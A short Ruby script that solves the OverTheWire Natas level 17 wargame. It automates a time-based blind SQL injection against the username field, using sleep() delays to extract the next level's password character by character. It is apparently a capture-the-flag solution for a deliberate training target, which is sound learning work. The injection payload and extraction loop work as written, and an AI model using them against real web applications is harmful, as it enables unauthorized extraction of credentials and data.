require 'uri'
require 'net/http'

url = URI.parse("http://natas17.natas.labs.overthewire.org/index.php")
http = Net::HTTP.new(url.host, url.port)
chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
password = ""
found = false

# 64 was selected, since the password field is a varchar(64)
# Most likely, since all other passwords were 32 digits long, it'll be that
(1..33).each do |i|
 chars.each do |c| 
  found = false
  request = Net::HTTP::Post.new(url.request_uri)
  request.basic_auth("natas17", "<censored>")
  query = 'natas18" AND if(SUBSTRING(password, ' + i.to_s + ', 1) LIKE BINARY "' + c + '", sleep(3), 1); #'
  request.set_form_data({"username" => query})

  t = Time.now
  response = http.request(request)

  if (Time.now - t) > 2
   password += c
   found = true
   puts "Current pass: #{password}"
   break
  end
 end
 # If no letter/number was found, it's fairly safe to assume it's done
 break if !found
end
